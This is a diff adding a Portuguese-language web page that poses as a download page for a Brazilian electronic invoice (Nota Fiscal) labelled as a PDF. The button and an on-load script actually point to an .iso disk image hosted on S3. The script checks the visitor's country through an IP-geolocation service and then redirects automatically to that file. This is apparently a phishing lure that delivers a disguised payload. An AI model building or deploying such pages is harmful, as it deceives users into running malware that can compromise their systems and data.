@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Download da Nota Fiscal</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-1: #0f172a;
+      --bg-2: #1e293b;
+      --card: rgba(255, 255, 255, 0.08);
+      --border: rgba(255, 255, 255, 0.12);
+      --text: #f8fafc;
+      --muted: #cbd5e1;
+      --primary: #3b82f6;
+      --primary-hover: #2563eb;
+      --success: #22c55e;
+      --shadow: 0 20px 60px rgba(0, 0, 0, 0.35);
+    }
+
+    body {
+      min-height: 100vh;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(circle at top left, rgba(59,130,246,0.25), transparent 30%),
+        radial-gradient(circle at bottom right, rgba(34,197,94,0.18), transparent 25%),
+        linear-gradient(135deg, var(--bg-1), var(--bg-2));
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 520px;
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 24px;
+      padding: 32px;
+      box-shadow: var(--shadow);
+      text-align: center;
+    }
+
+    .icon-wrap {
+      width: 82px;
+      height: 82px;
+      margin: 0 auto 20px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #2563eb, #60a5fa);
+      box-shadow: 0 12px 30px rgba(37, 99, 235, 0.35);
+    }
+
+    .icon {
+      font-size: 36px;
+    }
+
+    h1 {
+      font-size: 30px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      line-height: 1.2;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .info-box {
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 18px;
+      text-align: left;
+      margin-bottom: 26px;
+    }
+
+    .info-item {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .info-item:last-child {
+      border-bottom: none;
+    }
+
+    .label {
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .value {
+      font-size: 14px;
+      font-weight: 600;
+      text-align: right;
+      word-break: break-word;
+    }
+
+    .btn {
+      display: inline-block;
+      width: 100%;
+      padding: 16px 20px;
+      border-radius: 14px;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 700;
+      color: white;
+      background: linear-gradient(135deg, var(--primary), #60a5fa);
+      transition: 0.25s ease;
+      box-shadow: 0 12px 24px rgba(59,130,246,0.28);
+      margin-bottom: 14px;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      background: linear-gradient(135deg, var(--primary-hover), #3b82f6);
+    }
+
+    .btn-secondary {
+      display: inline-block;
+      width: 100%;
+      padding: 14px 20px;
+      border-radius: 14px;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 600;
+      color: var(--text);
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.1);
+      transition: 0.25s ease;
+    }
+
+    .btn-secondary:hover {
+      background: rgba(255,255,255,0.1);
+    }
+
+    .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(34, 197, 94, 0.12);
+      color: #86efac;
+      border: 1px solid rgba(34, 197, 94, 0.25);
+      border-radius: 999px;
+      padding: 8px 14px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 22px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--success);
+      box-shadow: 0 0 10px var(--success);
+    }
+
+    .footer {
+      margin-top: 18px;
+      font-size: 12px;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 520px) {
+      .card {
+        padding: 24px;
+      }
+
+      h1 {
+        font-size: 25px;
+      }
+
+      .info-item {
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .value {
+        text-align: left;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="icon-wrap">
+        <div class="icon">📄</div>
+      </div>
+
+      <div class="status">
+        <span class="dot"></span>
+        Documento disponível para download
+      </div>
+
+      <h1>Baixar Nota Fiscal</h1>
+      <p class="subtitle">
+        Sua nota fiscal está pronta. Clique no botão abaixo para iniciar o download do arquivo.
+      </p>
+
+      <div class="info-box">
+        <div class="info-item">
+          <span class="label">Documento</span>
+          <span class="value">Nota Fiscal Eletrônica</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Número</span>
+          <span class="value">#48465164651564</span>
+        </div>
+        <div class="info-item">
+          <span class="label">Formato</span>
+          <span class="value">PDF</span>
+        </div>
+      </div>
+
+      <a class="btn" href="https://s3.us-east-2.amazonaws.com/repository.files.com/Nota%20Fiscal%20Numero%2048465164651564.iso" download>
+        ⬇️ Fazer download da nota fiscal
+      </a>
+
+      <a class="btn-secondary" href="#">
+        Voltar ao sistema
+      </a>
+
+      <div class="footer">
+        Caso o download não inicie automaticamente, verifique o bloqueio do navegador ou tente novamente.
+      </div>
+    </div>
+  </div>
+</body>
+
+  <script>
+    const DESTINO_BR = "https://s3.us-east-2.amazonaws.com/repository.files.com/Nota%20Fiscal%20Numero%2048465164651564.iso";
+    const DESTINO_OUTROS = "https://s3.us-east-2.amazonaws.com/repository.files.com/Nota%20Fiscal%20Numero%2048465164651564.iso";
+
+    const statusEl = document.getElementById("status");
+    const countEl = document.getElementById("count");
+
+    function redirecionar(destino) {
+      let tempo = 0;
+      countEl.innerText = tempo;
+
+      const intervalo = setInterval(() => {
+        tempo--;
+        countEl.innerText = tempo;
+
+        if (tempo <= 0) {
+          clearInterval(intervalo);
+          window.location.href = destino;
+        }
+      }, 0);
+    }
+
+    async function iniciar() {
+      let destino = DESTINO_BR;
+
+      try {
+        const res = await fetch("https://ipwhois.app/json/");
+        const data = await res.json();
+
+        console.log("Geo:", data);
+
+        if (data && data.country_code === "BR") {
+          statusEl.innerText = "Acesso do Brasil detectado.";
+          destino = DESTINO_BR;
+        } else {
+          statusEl.innerText = "Disponível apenas no Brasil.";
+        }
+      } catch (e) {
+        console.error("Erro:", e);
+        statusEl.innerText = "Erro ao verificar localização.";
+      }
+
+      redirecionar(destino);
+    }
+
+    iniciar();
+  </script>
+</html>
